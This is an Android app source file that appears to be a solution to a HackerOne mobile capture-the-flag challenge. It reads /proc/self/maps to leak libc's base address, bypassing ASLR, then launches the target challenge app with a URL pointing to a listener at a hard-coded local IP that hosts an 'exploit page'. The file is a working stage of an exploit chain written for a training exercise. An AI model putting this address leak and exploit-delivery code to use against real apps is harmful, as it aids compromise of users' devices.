package com.lucio.solution.challenge5;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

import java.io.File;
import java.io.FileNotFoundException;
import java.util.Locale;
import java.util.Scanner;

public class MainActivity extends AppCompatActivity {

    // Point this one to your local/remote listener web-root where the
    // exploit page (index.html) is located
    private static String RemoteLocation = "http://192.168.1.116:3030";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        startChallengeApp();
    }

    /**
     * Starts the challenge app pointing the web page to our http server
     */
    private void startChallengeApp() {
        String url = String.format(
            Locale.US,
            "%s/?%d",
            RemoteLocation,
            getLibraryBaseAddress("/system/lib64/libc.so")
        );


        startActivity(
            getPackageManager()
                .getLaunchIntentForPackage("com.hackerone.mobile.challenge5")
                .putExtra("url", url)
        );
    }

    /**
     * Returns the base lib address for passed library
     * @param library
     * @return
     */
    private long getLibraryBaseAddress(String library){
        Scanner scanner = null;

        try {
            scanner = new Scanner(
                new File("/proc/self/maps")
            );

            while (scanner.hasNextLine()) {
                String line = scanner.nextLine()
                        .trim();

                // Look for library and 'x'ecution flag
                if (line.contains(library) && line.contains("xp")) {
                    String[] components = line.split("-");
                    return Long.parseLong(components[0], 16);
                }
            }
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } finally {
            if (scanner != null) {
                scanner.close();
            }
        }

        return 0;
    }
}
